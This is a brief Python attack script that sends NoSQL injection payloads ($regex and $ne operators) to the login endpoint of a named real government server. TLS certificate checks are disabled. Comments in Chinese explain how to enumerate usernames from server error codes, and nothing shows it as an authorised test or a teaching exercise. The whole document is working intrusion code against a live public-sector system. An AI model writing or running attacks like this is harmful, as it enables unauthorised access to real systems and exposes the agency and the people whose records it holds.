import json, ssl, urllib.request, urllib.error, time
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"
def post_login(body_dict):
    body=json.dumps(body_dict).encode()
    req=urllib.request.Request(BASE+"/login",data=body,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

# 用户名枚举: $regex 匹配特定前缀 → 如果该前缀有用户则 500 (TypeError=单匹配崩溃), 无则可能不同
# 用 $regex "^a$" 等精确单字符 → 若存在该用户则触发 500, 不存在则 ?
print("=== 用户名首字母枚举 ($regex ^X$) ===")
for ch in ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3']:
    body={"username":{"$regex":f"^{ch}$"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    code,b=post_login(body)
    print(f"  {ch} -> {code} | {b[:80]}")
    time.sleep(0.1)
print("DONE")
